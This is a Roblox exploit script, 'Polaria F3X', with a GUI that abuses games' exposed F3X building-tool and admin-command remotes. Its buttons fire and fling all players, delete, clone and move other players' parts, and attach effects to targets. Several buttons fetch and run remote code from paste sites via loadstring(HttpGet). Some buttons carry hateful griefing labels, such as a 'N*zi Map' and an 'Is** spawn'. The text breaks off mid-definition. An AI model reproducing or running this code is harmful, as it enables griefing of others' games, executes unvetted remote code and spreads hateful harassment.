--[ Polaria F3X by anonymoos11i11i1 V.7 Last version (I'm quiting this f3x exploits shit bro) ]--


--[ if you deobfuscate and see this message I want to say that scripting is never a easy thing for me I try to learn Lua learn to understand stuffs my self I can make a gui I can make a SYNCAPI script but it's all over nothing is left I tried several several times but the winner get to write history and not the loser this community is full of doxing and cyber crimes I can't believe this collapsing kids game can have this dark truth ai is a tool that created hundreds of skids on scriptblox and now people can't even identify what's ai and what's not I am very disappointed you act tuff while you can't do shit ]--


--[ Make sure your device is not a potato to run the maps properly ]--

--[ Printing (Very useless)]--
pe.Font = Enum.Font.Arial
pe.Text = "Fire all"
pe.TextColor3 = Color3.fromRGB(255, 255, 255)
pe.TextScaled = true
pe.TextSize = 18.000
pe.TextWrapped = true
pe.MouseButton1Click:Connect(function()
rq:InvokeServer(";fire all")
end)

fling.Name = "fling"
fling.Parent = serverpage
fling.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
fling.BorderColor3 = Color3.fromRGB(129, 26, 255)
fling.BorderSizePixel = 2
fling.Position = UDim2.new(0.0306345727, 0, 0.789285719, 0)
fling.Size = UDim2.new(0, 104, 0, 29)
fling.Font = Enum.Font.Arial
fling.Text = "Fling All"
fling.TextColor3 = Color3.fromRGB(255, 255, 255)
fling.TextScaled = true
fling.TextSize = 18.000
fling.TextWrapped = true
fling.MouseButton1Click:Connect(function()
rq:InvokeServer(";fling all")
end)

scriptspage.Name = "scriptspage"
scriptspage.Parent = Holder
scriptspage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scriptspage.BackgroundTransparency = 1.000
scriptspage.BorderColor3 = Color3.fromRGB(0, 0, 0)
scriptspage.BorderSizePixel = 0
scriptspage.Position = UDim2.new(0, 0, 0.093247585, 0)
scriptspage.Size = UDim2.new(0, 457, 0, 282)
scriptspage.Visible = false

ssp.Name = "ssp"
ssp.Parent = scriptspage
ssp.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ssp.BorderColor3 = Color3.fromRGB(129, 26, 255)
ssp.BorderSizePixel = 2
ssp.Position = UDim2.new(0.271334797, 0, 0.0357142873, 0)
ssp.Size = UDim2.new(0, 104, 0, 29)
ssp.Font = Enum.Font.Arial
ssp.Text = "SSP"
ssp.TextColor3 = Color3.fromRGB(255, 255, 255)
ssp.TextSize = 18.000
ssp.TextWrapped = true

nzi.Name = "nzi"
nzi.Parent = scriptspage
nzi.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
nzi.BorderColor3 = Color3.fromRGB(129, 26, 255)
nzi.BorderSizePixel = 2
nzi.Position = UDim2.new(0.512035012, 0, 0.0357142873, 0)
nzi.Size = UDim2.new(0, 104, 0, 29)
nzi.Font = Enum.Font.Arial
nzi.Text = "N*zi Map"
nzi.TextColor3 = Color3.fromRGB(255, 255, 255)
nzi.TextSize = 18.000
nzi.TextWrapped = true

hax1.Name = "hax 1"
hax1.Parent = scriptspage
hax1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
hax1.BorderColor3 = Color3.fromRGB(129, 26, 255)
hax1.BorderSizePixel = 2
hax1.Position = UDim2.new(0.752735257, 0, 0.0357142873, 0)
hax1.Size = UDim2.new(0, 99, 0, 29)
hax1.Font = Enum.Font.Arial
hax1.Text = "Hax GUI V1"
hax1.TextColor3 = Color3.fromRGB(255, 255, 255)
hax1.TextSize = 18.000
hax1.TextWrapped = true

hax2.Name = "hax 2"
hax2.Parent = scriptspage
hax2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
hax2.BorderColor3 = Color3.fromRGB(129, 26, 255)
hax2.BorderSizePixel = 2
hax2.Position = UDim2.new(0.752735257, 0, 0.159827814, 0)
hax2.Size = UDim2.new(0, 99, 0, 29)
hax2.Font = Enum.Font.Arial
hax2.Text = "Hax GUI V2"
hax2.TextColor3 = Color3.fromRGB(255, 255, 255)
hax2.TextSize = 18.000
hax2.TextWrapped = true

ship.Name = "ship"
ship.Parent = scriptspage
ship.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ship.BorderColor3 = Color3.fromRGB(129, 26, 255)
ship.BorderSizePixel = 2
ship.Position = UDim2.new(0.512035012, 0, 0.159827814, 0)
ship.Size = UDim2.new(0, 104, 0, 29)
ship.Font = Enum.Font.Arial
ship.Text = "Worship"
ship.TextColor3 = Color3.fromRGB(255, 255, 255)
ship.TextSize = 18.000
ship.TextWrapped = true

noot.Name = "noot"
noot.Parent = scriptspage
noot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
noot.BorderColor3 = Color3.fromRGB(129, 26, 255)
noot.BorderSizePixel = 2
noot.Position = UDim2.new(0.271334797, 0, 0.159827814, 0)
noot.Size = UDim2.new(0, 104, 0, 29)
noot.Font = Enum.Font.Arial
noot.Text = "N00t N00t!"
noot.TextColor3 = Color3.fromRGB(255, 255, 255)
noot.TextSize = 18.000
noot.TextWrapped = true

sledoni.Name = "sledoni"
sledoni.Parent = scriptspage
sledoni.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sledoni.BorderColor3 = Color3.fromRGB(129, 26, 255)
sledoni.BorderSizePixel = 2
sledoni.Position = UDim2.new(0.0306345727, 0, 0.159827814, 0)
sledoni.Size = UDim2.new(0, 104, 0, 29)
sledoni.Font = Enum.Font.Arial
sledoni.Text = "Sheldoni"
sledoni.TextColor3 = Color3.fromRGB(255, 255, 255)
sledoni.TextSize = 18.000
sledoni.TextWrapped = true

sledoniyong.Name = "sledoni yong"
sledoniyong.Parent = scriptspage
sledoniyong.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sledoniyong.BorderColor3 = Color3.fromRGB(129, 26, 255)
sledoniyong.BorderSizePixel = 2
sledoniyong.Position = UDim2.new(0.0306345727, 0, 0.283941269, 0)
sledoniyong.Size = UDim2.new(0, 104, 0, 29)
sledoniyong.Font = Enum.Font.Arial
sledoniyong.Text = "yong Sheldon"
sledoniyong.TextColor3 = Color3.fromRGB(255, 255, 255)
sledoniyong.TextSize = 18.000
sledoniyong.TextWrapped = true

grand.Name = "grand"
grand.Parent = scriptspage
grand.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
grand.BorderColor3 = Color3.fromRGB(129, 26, 255)
grand.BorderSizePixel = 2
grand.Position = UDim2.new(0.271334797, 0, 0.283941269, 0)
grand.Size = UDim2.new(0, 104, 0, 29)
grand.Font = Enum.Font.Arial
grand.Text = "Grandosla"
grand.TextColor3 = Color3.fromRGB(255, 255, 255)
grand.TextSize = 18.000
grand.TextWrapped = true
grand.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/RV6zj9LG/raw"))()
end)

exca.Name = "exca"
exca.Parent = scriptspage
exca.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
exca.BorderColor3 = Color3.fromRGB(129, 26, 255)
exca.BorderSizePixel = 2
exca.Position = UDim2.new(0.512035012, 0, 0.283941269, 0)
exca.Size = UDim2.new(0, 104, 0, 29)
exca.Font = Enum.Font.Arial
exca.Text = "Excavator"
exca.TextColor3 = Color3.fromRGB(255, 255, 255)
exca.TextSize = 18.000
exca.TextWrapped = true
exca.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/kmVobM6x/raw"))()
end)

r6_2.Name = "r6"
r6_2.Parent = scriptspage
r6_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
r6_2.BorderColor3 = Color3.fromRGB(129, 26, 255)
r6_2.BorderSizePixel = 2
r6_2.Position = UDim2.new(0.752735257, 0, 0.282168239, 0)
r6_2.Size = UDim2.new(0, 99, 0, 29)
r6_2.Font = Enum.Font.Arial
r6_2.Text = "R6"
r6_2.TextColor3 = Color3.fromRGB(255, 255, 255)
r6_2.TextSize = 18.000
r6_2.TextWrapped = true
r6_2.MouseButton1Click:Connect(function()
rq:InvokeServer(";r6")
end)

primadon.Name = "primadon"
primadon.Parent = scriptspage
primadon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
primadon.BorderColor3 = Color3.fromRGB(129, 26, 255)
primadon.BorderSizePixel = 2
primadon.Position = UDim2.new(0.0306345727, 0, 0.0357142873, 0)
primadon.Size = UDim2.new(0, 104, 0, 29)
primadon.Font = Enum.Font.Arial
primadon.Text = "Primadon"
primadon.TextColor3 = Color3.fromRGB(255, 255, 255)
primadon.TextSize = 18.000
primadon.TextWrapped = true

topkek.Name = "topkek"
topkek.Parent = scriptspage
topkek.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
topkek.BorderColor3 = Color3.fromRGB(129, 26, 255)
topkek.BorderSizePixel = 2
topkek.Position = UDim2.new(0.0306345727, 0, 0.418692946, 0)
topkek.Size = UDim2.new(0, 104, 0, 29)
topkek.Font = Enum.Font.Arial
topkek.Text = "McDonalds"
topkek.TextColor3 = Color3.fromRGB(255, 255, 255)
topkek.TextSize = 18.000
topkek.TextWrapped = true
topkek.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/s5dHfkXX/raw"))()
end)

subspace.Name = "subspace"
subspace.Parent = scriptspage
subspace.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
subspace.BorderColor3 = Color3.fromRGB(129, 26, 255)
subspace.BorderSizePixel = 2
subspace.Position = UDim2.new(0.271334797, 0, 0.418692946, 0)
subspace.Size = UDim2.new(0, 104, 0, 29)
subspace.Font = Enum.Font.Arial
subspace.Text = "Is** spawn"
subspace.TextColor3 = Color3.fromRGB(255, 255, 255)
subspace.TextSize = 18.000
subspace.TextWrapped = true
subspace.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/HkQQ4Zww"))()
end)

bom2.Name = "bom 2"
bom2.Parent = scriptspage
bom2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bom2.BorderColor3 = Color3.fromRGB(129, 26, 255)
bom2.BorderSizePixel = 2
bom2.Position = UDim2.new(0.512035012, 0, 0.418692946, 0)
bom2.Size = UDim2.new(0, 104, 0, 29)
bom2.Font = Enum.Font.Arial
bom2.Text = "Cl*ic btools"
bom2.TextColor3 = Color3.fromRGB(255, 255, 255)
bom2.TextScaled = true
bom2.TextSize = 18.000
bom2.TextWrapped = true
bom2.MouseButton1Click:Connect(function()
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local tool
for _, v in ipairs(LocalPlayer:GetDescendants()) do
	if v.Name == "SyncAPI" then
		tool = v.Parent
		break
	end
end

if not tool then
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then
			tool = v.Parent
			break
		end
	end
end

if not tool then return end

local r = tool.SyncAPI.ServerEndpoint
local function call(args)
	r:InvokeServer(unpack(args))
end

local deleteTool = Instance.new("Tool")
deleteTool.Name = "Delete"
deleteTool.RequiresHandle = false
deleteTool.TextureId = "rbxassetid://5432160999"
deleteTool.Parent = LocalPlayer.Backpack

local s1 = Instance.new("SelectionBox")
s1.Color3 = Color3.new(1, 0, 0)
s1.LineThickness = 0.05
s1.Visible = false
s1.Parent = game.CoreGui

local c1
deleteTool.Equipped:Connect(function()
	if c1 then c1:Disconnect() end
	c1 = Mouse.Button1Down:Connect(function()
		local t = Mouse.Target
		if t and t:IsA("BasePart") then
			s1.Adornee = t
			s1.Visible = true
			task.wait(0.1)
			call({ "Remove", { t } })
			s1.Visible = false
			s1.Adornee = nil
		end
	end)
end)

deleteTool.Unequipped:Connect(function()
	if c1 then c1:Disconnect() c1 = nil end
	s1.Visible = false
	s1.Adornee = nil
end)

local cloneTool = Instance.new("Tool")
cloneTool.Name = "Clone"
cloneTool.RequiresHandle = false
cloneTool.TextureId = "rbxassetid://138745565107313"
cloneTool.Parent = LocalPlayer.Backpack

local s2 = Instance.new("SelectionBox")
s2.Color3 = Color3.new(0, 1, 0)
s2.LineThickness = 0.05
s2.Visible = false
s2.Parent = game.CoreGui

local c2
cloneTool.Equipped:Connect(function()
	if c2 then c2:Disconnect() end
	c2 = Mouse.Button1Down:Connect(function()
		local t = Mouse.Target
		if t and t:IsA("BasePart") then
			s2.Adornee = t
			s2.Visible = true
			call({ "Clone", { t }, workspace })
			task.wait(0.15)
			call({ "SyncMove", { { Part = t, CFrame = t.CFrame * CFrame.new(0, 4, 0) } } })
			s2.Visible = false
			s2.Adornee = nil
		end
	end)
end)

cloneTool.Unequipped:Connect(function()
	if c2 then c2:Disconnect() c2 = nil end
	s2.Visible = false
	s2.Adornee = nil
end)

local moveTool = Instance.new("Tool")
moveTool.Name = "Move"
moveTool.RequiresHandle = false
moveTool.TextureId = "rbxassetid://84615697070708"
moveTool.Parent = LocalPlayer.Backpack

local s3 = Instance.new("SelectionBox")
s3.Color3 = Color3.new(0, 0.7, 1)
s3.LineThickness = 0.05
s3.Visible = false
s3.Parent = game.CoreGui

local selectedPart
local moving = false
local moveConnDown, moveConnUp, moveConnMove

moveTool.Equipped:Connect(function()
	if moveConnDown then moveConnDown:Disconnect() end
	moveConnDown = Mouse.Button1Down:Connect(function()
		if not selectedPart then
			local t = Mouse.Target
			if t and t:IsA("BasePart") then
				selectedPart = t
				s3.Adornee = t
				s3.Visible = true
			end
		else
			moving = true
		end
	end)

	if moveConnUp then moveConnUp:Disconnect() end
	moveConnUp = UIS.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch then
			moving = false
		end
	end)

	if moveConnMove then moveConnMove:Disconnect() end
	moveConnMove = UIS.InputChanged:Connect(function(input)
		if moving and selectedPart then
			if input.UserInputType == Enum.UserInputType.MouseMovement
			or input.UserInputType == Enum.UserInputType.Touch then
				local ray = workspace.CurrentCamera:ScreenPointToRay(Mouse.X, Mouse.Y)
				local pos = ray.Origin + ray.Direction * 20
				call({ "SyncMove", { { Part = selectedPart, CFrame = CFrame.new(pos) } } })
			end
		end
	end)
end)

moveTool.Unequipped:Connect(function()
	if moveConnDown then moveConnDown:Disconnect() end
	if moveConnUp then moveConnUp:Disconnect() end
	if moveConnMove then moveConnMove:Disconnect() end
	s3.Visible = false
	s3.Adornee = nil
	selectedPart = nil
	moving = false
end)

end)

pistol.Name = "pistol"
pistol.Parent = scriptspage
pistol.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
pistol.BorderColor3 = Color3.fromRGB(129, 26, 255)
pistol.BorderSizePixel = 2
pistol.Position = UDim2.new(0.752735257, 0, 0.418692946, 0)
pistol.Size = UDim2.new(0, 99, 0, 29)
pistol.Font = Enum.Font.Arial
pistol.Text = "Pistol"
pistol.TextColor3 = Color3.fromRGB(255, 255, 255)
pistol.TextSize = 18.000
pistol.TextWrapped = true
pistol.MouseButton1Click:Connect(function()
rq:InvokeServer(";gear me 97885508")
end)

topkek5.Name = "topkek 5"
topkek5.Parent = scriptspage
topkek5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
topkek5.BorderColor3 = Color3.fromRGB(129, 26, 255)
topkek5.BorderSizePixel = 2
topkek5.Position = UDim2.new(0.0306345727, 0, 0.542806447, 0)
topkek5.Size = UDim2.new(0, 104, 0, 29)
topkek5.Font = Enum.Font.Arial
topkek5.Text = "Burger King"
topkek5.TextColor3 = Color3.fromRGB(255, 255, 255)
topkek5.TextSize = 18.000
topkek5.TextWrapped = true
topkek5.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/a0nYgEIl/raw"))()
end)

mosque.Name = "mosque"
mosque.Parent = scriptspage
mosque.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mosque.BorderColor3 = Color3.fromRGB(129, 26, 255)
mosque.BorderSizePixel = 2
mosque.Position = UDim2.new(0.271334797, 0, 0.542806447, 0)
mosque.Size = UDim2.new(0, 104, 0, 29)
mosque.Font = Enum.Font.Arial
mosque.Text = "Mosque"
mosque.TextColor3 = Color3.fromRGB(255, 255, 255)
mosque.TextSize = 18.000
mosque.TextWrapped = true
mosque.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/TVlj4DoU/raw"))()
wait(5)
loadstring(game:HttpGet("https://files.catbox.moe/8e8ivx.txt"))()
end)

MLG.Name = "MLG"
MLG.Parent = scriptspage
MLG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MLG.BorderColor3 = Color3.fromRGB(129, 26, 255)
MLG.BorderSizePixel = 2
MLG.Position = UDim2.new(0.512035012, 0, 0.542806447, 0)
MLG.Size = UDim2.new(0, 104, 0, 29)
MLG.Font = Enum.Font.Arial
MLG.Text = "Rc7 cloud"
MLG.TextColor3 = Color3.fromRGB(255, 255, 255)
MLG.TextSize = 18.000
MLG.TextWrapped = true
MLG.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/anuKZunN"))()
end)

hung.Name = "hung"
hung.Parent = scriptspage
hung.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
hung.BorderColor3 = Color3.fromRGB(129, 26, 255)
hung.BorderSizePixel = 2
hung.Position = UDim2.new(0.752735257, 0, 0.542806447, 0)
hung.Size = UDim2.new(0, 99, 0, 29)
hung.Font = Enum.Font.Arial
hung.Text = "KFC"
hung.TextColor3 = Color3.fromRGB(255, 255, 255)
hung.TextSize = 18.000
hung.TextWrapped = true
hung.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/AWJkWABQ/raw"))()
end)

trshhyub.Name = "trsh hyub"
trshhyub.Parent = scriptspage
trshhyub.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
trshhyub.BorderColor3 = Color3.fromRGB(129, 26, 255)
trshhyub.BorderSizePixel = 2
trshhyub.Position = UDim2.new(0.0306345727, 0, 0.666919887, 0)
trshhyub.Size = UDim2.new(0, 104, 0, 29)
trshhyub.Font = Enum.Font.Arial
trshhyub.Text = "TrashGui"
trshhyub.TextColor3 = Color3.fromRGB(255, 255, 255)
trshhyub.TextSize = 18.000
trshhyub.TextWrapped = true
trshhyub.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://files.catbox.moe/79i6qt.txt"))()
end)

gkv1.Name = "gkv1"
gkv1.Parent = scriptspage
gkv1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
gkv1.BorderColor3 = Color3.fromRGB(129, 26, 255)
gkv1.BorderSizePixel = 2
gkv1.Position = UDim2.new(0.271334797, 0, 0.666919887, 0)
gkv1.Size = UDim2.new(0, 104, 0, 29)
gkv1.Font = Enum.Font.Arial
gkv1.Text = "Grab knife 4"
gkv1.TextColor3 = Color3.fromRGB(255, 255, 255)
gkv1.TextSize = 18.000
gkv1.TextWrapped = true
gkv1.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification


local Players = game:GetService("Players")

local UserInputService = game:GetService("UserInputService")

if not character:FindFirstChild('Accessory (KNIF4ELERFTAccessory)') or character:FindFirstChild("Accessory (Knife McGrabbington III)") then
ready = false

local function notify(msg)
    local MainGUI = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI")
    if not MainGUI then
        MainGUI = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        MainGUI.Name = "MainGUI"
    end

    coroutine.wrap(function()
        for _, v in pairs(MainGUI:GetChildren()) do
            if v:IsA("TextLabel") then v:Destroy() end
        end

        local TextLabel = Instance.new("TextLabel")
        local Frame = Instance.new("Frame")

        TextLabel.Parent = MainGUI
        TextLabel.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
        TextLabel.BorderSizePixel = 0
        TextLabel.Position = UDim2.new(0.2, 0, 0.05, -10)
        TextLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
        TextLabel.Font = Enum.Font.SourceSans
        TextLabel.TextColor3 = Color3.new(1, 1, 1)
        TextLabel.TextSize = 35
        TextLabel.TextScaled = true
        TextLabel.TextYAlignment = Enum.TextYAlignment.Center
        TextLabel.TextXAlignment = Enum.TextXAlignment.Left
        TextLabel.Text = ""
        TextLabel.BackgroundTransparency = 1

        Frame.Parent = TextLabel
        Frame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
        Frame.BorderSizePixel = 0
        Frame.Transparency = 1
        Frame.Position = UDim2.new(0, 0, 1, 0)
        Frame.Size = UDim2.new(1, 0, 0, 5)

        for i = 1, 8 do
            TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency - 0.1
            TextLabel.Position = TextLabel.Position + UDim2.new(0, 0, 0, 1)
            Frame.Transparency = Frame.Transparency - 0.1
            task.wait()
        end

        msg = "  " .. msg
        for i = 1, #msg do
            TextLabel.Text = string.sub(msg, 1, i)
            task.wait()
        end

        task.wait(1)

        for i = 1, 8 do
            TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency + 0.1
            TextLabel.Position = TextLabel.Position - UDim2.new(0, 0, 0, 2)
            Frame.Transparency = Frame.Transparency + 0.1
            task.wait()
        end
        TextLabel:Destroy()
    end)()
end


RequestCommand:InvokeServer(";hat me 18268136683")

yeah=player.Backpack:FindFirstChild('Building Tools') or player.Backpack:FindFirstChild('F3X Btools!')
if yeah then
notify("This game has f3x/you have f3x so everyone gonna see what you're doing.")
task.wait(3)
notify("Press 'Z' to equip.")
elseif not yeah then
notify("LOL this game has no btools or f3x so this not gonna work here")
end

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end
function SetCollision(part, boolean)
    local args = {
        [1] = "SyncCollision",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CanCollide"] = boolean
            }
        }
    }
    _(args)
end
    function SetLocked(part,boolean)
        local args = {
            [1] = "SetLocked",
            [2] = {
                [1] = part
            },
            [3] = boolean
        }
        _(args)
    end
function yerpp(E)
local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = E,
                ["DecorationType"] = "Sparkles"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = E,
                ["DecorationType"] = "Sparkles",
                ["SparkleColor"] = Color3.fromRGB(255, 255, 0)
            } 
        } 
    }
    _(argsCreate)
    _(argsSync)
end

local knfe = character["Accessory (Knife McGrabbington III)"]

if knfe then
	local args = {
		"Remove",
		{
			knfe.Handle.SpecialMesh
		}
	}

	_(args)
end

local function Resize(part, size, ha)
	local args = {
		"SyncResize",
		{
			{
				Part = part,
				CFrame = ha,
				Size = size
			}
		}
	}
	_(args)
end

local function SetAnchor(boolean, part)
	local args = {
		"SyncAnchor",
		{
			{
				Part = part,
				Anchored = boolean
			}
		}
	}
	_(args)
end

function MovePart(part, cf)
    local args = {
        [1] = "SyncMove",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf
            }
        }
    }
    _(args)
end

local function Color(part, color)
	local args = {
		"SyncColor",
		{
			{
				Part = part,
				Color = color,
				UnionColoring = false
			}
		}
	}
	_(args)
end
function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

    function DestroyPart(part)
        local args = {
            [1] = "Remove",
            [2] = {
                [1] = part
            }
        }
        _(args)
    end

	function SetMesh(part,meshid,offseter)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
            ["Offset"] = offseter,
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = "rbxassetid://" .. texid
            }
        }
    }
    _(args)
end

    function SetTrans(part,int)
        local args = {
            [1] = "SyncMaterial",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Transparency"] = int
                }
            }
        }
        _(args)
    end

spawn(function()
yerpp(knfe.Handle)
end)
spawn(function()
AddMesh(knfe.Handle)
end)
spawn(function()
SetMesh(knfe.Handle, "18114736783",Vector3.new(0, 0, 0))
end)
spawn(function()
SetTexture(knfe.Handle, "80617091791234")
end)

function bleed(target)
    if not target or not target.Character then return end
    
    local stopBleeding = false
    local activeBloodParts = {} 
    local characterConnection
    characterConnection = target.CharacterAdded:Connect(function()
        stopBleeding = true

        for _, blood in pairs(activeBloodParts) do
            if blood and blood.Parent then
                DestroyPart(blood)
            end
        end
        if characterConnection then
            characterConnection:Disconnect()
        end
    end)
    

    coroutine.wrap(function()
        while not stopBleeding and target and target.Character do
            local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
            local rootPart = target.Character:FindFirstChild("HumanoidRootPart")
            
            if rootPart then

                coroutine.wrap(function()
                yez=CFrame.new(0,-10,0)
                    local blood = remote:InvokeServer("CreatePart", "Ball", yez, target.Character)
                    if blood then
                        table.insert(activeBloodParts, blood)
                        
                        spawn(function()
                        Color(blood, Color3.fromRGB(255, 0, 0))
                        end)
                    
                        spawn(function()
    Resize(blood, Vector3.new(0.2, 0.2, 0.2), rootPart.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1)))
end)
                        spawn(function()
                        SetAnchor(false, blood)
                        end)
                        coroutine.wrap(function()
                            wait(2)
                            Resize(blood, Vector3.new(0.8, 0.1, 0.8),blood.CFrame)
                            Resize(blood, Vector3.new(0.9, 0.1, 0.9),blood.CFrame)
                            SetTrans(blood, 0.9)
                            SetTrans(blood, 0.7)
                            SetTrans(blood, 0.5)
                            SetTrans(blood, 0.3)
                            SetTrans(blood, 0.1)
                            DestroyPart(blood)
                            
                        
                            for i, v in pairs(activeBloodParts) do
                                if v == blood then
                                    table.remove(activeBloodParts, i)
                                    break
                                end
                            end
                        end)()
                    end
                end)()
            end
            
            wait(0.005)
        end
    end)()
end

function c0lefect(E)
local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = E,
                ["DecorationType"] = "Sparkles"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = E,
                ["DecorationType"] = "Sparkles",
                ["SparkleColor"] = Color3.fromRGB(255, 255, 0)
            } 
        } 
    }

local args = {
	"Remove",
	{
		E:FindFirstChild('Sparkles')
	}
}



    _(argsCreate)
    _(argsSync)
task.wait(1)
    _(args)
end


			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
	
			end
function breakWelds(part)
    local welds = {}
    for _, weld in ipairs(part:GetDescendants()) do
        if weld:IsA("WeldConstraint") or weld:IsA("Weld") or weld:IsA("Motor6D") then
            table.insert(welds, weld)
        end
    end

    if #welds == 0 then
        return false
    end

    local args = {
        "RemoveWelds",
        welds
    }
    _(args)
    return true
end

local humanoid = character:FindFirstChildOfClass("Humanoid")

local arm = character:FindFirstChild("Right Arm") and character:FindFirstChild("Left Arm") and character:FindFirstChild("Torso") 
local holdAnimation = Instance.new("Animation")
holdAnimation.AnimationId = "rbxassetid://48146273"
local holdTrack = humanoid:LoadAnimation(holdAnimation)

local killAnimation = Instance.new("Animation")
killAnimation.AnimationId = "rbxassetid://48146273"
local killTrack = humanoid:LoadAnimation(killAnimation)

local knifeHoldAnim = Instance.new("Animation")
knifeHoldAnim.AnimationId = "rbxassetid://299225058"

local staffupAnim = Instance.new("Animation")
